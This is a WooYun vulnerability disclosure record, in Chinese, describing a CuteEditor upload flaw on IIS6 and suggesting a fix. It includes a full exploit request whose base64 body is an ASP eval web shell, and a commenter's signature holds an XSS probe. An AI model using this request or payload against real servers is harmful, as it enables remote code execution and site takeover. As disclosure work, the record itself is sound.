{"id": 1808, "wybug_id": "wooyun-2014-061932", "wybug_title": "CuteEditor脚本文件上传漏洞", "wybug_corp": "CuteEditor", "wybug_author": "zcgonvh", "wybug_date": "2014-05-27 16:18", "wybug_open_date": "2014-08-25 16:20", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-02：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-25：\t细节向公众公开  简要描述： CuteEditor对文件名某些字符过滤不当，在一定条件下可getshell。 详细说明：  漏洞文件：CuteEditor/uploader.ashx，调用方法：\n[CuteEditor]CuteEditor.UploadModule::HandleAddonUpload():bool\n方法判断QueryString中的_Addon参数是否为空，并将_AddonGuid参数转换为GUID。当_Addon为upload时，调用方法\n[CuteEditor]CuteEditor.UploadModule.a(HttpContext, Guid):bool\n此方法将上传的第一个文件以  uploading.GUID.上传文件名.resx  形式保存在~/UploaderTemp目录中。虽然.net不允许0x00截断，但在iis6下可以通过分号截断。当_Addon为xhttp时，会将整个HTTP主体进行base64解码，之后以同样的方式进行保存。于是在iis6下，可以提交以下请求getshell，guid不能和服务器上已有文件重复\nPOST /CuteSoft_Client/CuteEditor/uploader.ashx?_Addon=xhttp&_AddonGuid=e7d8104a-0ba6-4b47-8285-59d442e2b7d3&_PartialStart=0&_PartialFileName=1.asp; HTTP/1.1Host: XXXXXXContent-Length: 28PCVldmFsIHJlcXVlc3QoImEiKSU+\n   漏洞证明：  本地测试：\n\n   修复方案：  向[CuteEditor]CuteEditor.b::f(string):string方法定义的非法字符列表中添加分号   版权声明：转载请注明来源 zcgonvh@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-05-30 22:05 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-27 22:58 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  大牛来了啊    \n     2014-05-27 23:01 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  @wefgod 你真活跃    \n     2014-05-27 23:02 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @Mosuan 我看见这漏洞标题我第一个就想到此大牛。进来果然是。无比崇拜他写的东西    \n     2014-05-27 23:25 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  @wefgod 求介绍求博客    \n     2014-05-27 23:52 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @Mody 之前有的东西是发在90sec的    \n     2014-11-24 20:02 |    \t\tdepycode \t\t\t( 普通白帽子  |\t\t\t        Rank:275 漏洞数:44        | 关注网络安全，提高技术！)\t\t \n  @wefgod 是啊 确实是大牛，在土司里面看到了他写的东西。膜拜大牛。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}